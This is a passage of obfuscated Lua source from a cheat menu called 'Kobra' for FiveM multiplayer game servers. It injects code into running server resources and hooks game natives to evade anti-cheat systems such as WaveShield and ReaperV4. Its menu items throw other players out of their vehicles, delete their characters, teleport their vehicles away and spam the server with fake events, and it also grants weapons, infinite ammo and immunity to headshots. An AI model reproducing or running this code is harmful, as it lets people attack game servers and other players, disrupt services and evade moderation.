                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v578))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v577=2 -0 ;end end else v281:Notify("error","Kobra","You must select a player to do this!",3000);end end},{type="button",label="Teleport to Ocean",onSelect=function() local v419=1817 -(348 + 1469) ;local v420;while true do if (v419==(1290 -(1115 + 174))) then if v420 then local v874=0 -0 ;local v875;while true do if (v874==(1016 -(85 + 929))) then v27[v420]=true;v281:UpdateListMenu();break;end if (v874==(1 + 0)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v875))) then local v1211=0;while true do if ((1867 -(1151 + 716))==v1211) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",1029 + 1971 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1299=1,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v875))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v874=2;end if (v874==(1704 -(95 + 1609))) then v875=GetPlayerFromServerId(v420);if (v875== -(3 -2)) then local v1212=0;while true do if (v1212==1) then v12:UpdateListMenu();return;end if (v1212==(758 -(364 + 394))) then v281:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",2719 + 281 );v27[v420]=nil;v1212=1;end end end v874=1 + 0 ;end end else v281:Notify("error","Kobra","You must select a player to do this!",3000);end break;end if (v419==0) then v420=nil;for v799,v800 in pairs(v27) do if v800 then v420=v799;break;end end v419=1 + 0 ;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v421) if v421 then local v579=0;while true do if (v579==(0 + 0)) then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);break;end end else local v580=0 + 0 ;while true do if (0==v580) then print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v543) if (v543 and (v543~="")) then v281:SpawnSelectedWeapon(v543);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v281:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v281:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=2 -1 ,values=v281:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v422) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v422));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=2 -1 ,values=v281:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v423) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v423));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v424) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v424));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v425) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v425));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v426) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v426));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1165 -(274 + 890) ,values=v281:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v427) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v427));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v428) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v428));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v429) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v429));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v430) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v430));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v431) if v431 then local v581=1154 -(1018 + 136) ;while true do if (v581==0) then v281:Notify("success","Kobra","Enabled Infinite Ammo",651 + 4349 );v281:EnableInfiniteAmmo();break;end end else local v582=0;while true do if (v582==(0 -0)) then v281:Notify("error","Kobra","Disabled Infinite Ammo",5815 -(117 + 698) );v281:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v432) if v432 then local v583=0;while true do if (v583==(0 + 0)) then v281:Notify("success","Kobra","Enabled Anti-Headshot",3737 + 1263 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else local v584=0 -0 ;while true do if (v584==(0 + 0)) then v281:Notify("error","Kobra","Disabled Anti-Headshot",8650 -3650 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v433) v43=v433 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v434) v42=v434 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v544) if (v544 and (v544~="")) then v281:SpawnSelectedVehicle(v544,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=4 -3 ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v435) v281:SpawnSelectedVehicle(v435,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v436) v281:SpawnSelectedVehicle(v436,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v437) v281:SpawnSelectedVehicle(v437,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1632 -(12 + 1619) ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v438) v281:SpawnSelectedVehicle(v438,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=4 -3 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v439) v281:SpawnSelectedVehicle(v439,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v440) v281:SpawnSelectedVehicle(v440,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v441) v281:SpawnSelectedVehicle(v441,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v442) v281:SpawnSelectedVehicle(v442,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v443) v281:SpawnSelectedVehicle(v443,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v444) v281:SpawnSelectedVehicle(v444,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v445) v281:SpawnSelectedVehicle(v445,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v446) v281:SpawnSelectedVehicle(v446,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v447) v281:SpawnSelectedVehicle(v447,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v545) if (v545 and (v545~="")) then local v696=0 -0 ;local v697;while true do if (v696==(1873 -(674 + 1199))) then v697=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v545);MachoInjectResourceRaw("any",v697);break;end end else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v281:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v448=0 + 0 ;while true do if (v448==(0 -0)) then v12:Notify("success","Kobra","Cleaned Vehicle",12827 -9827 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
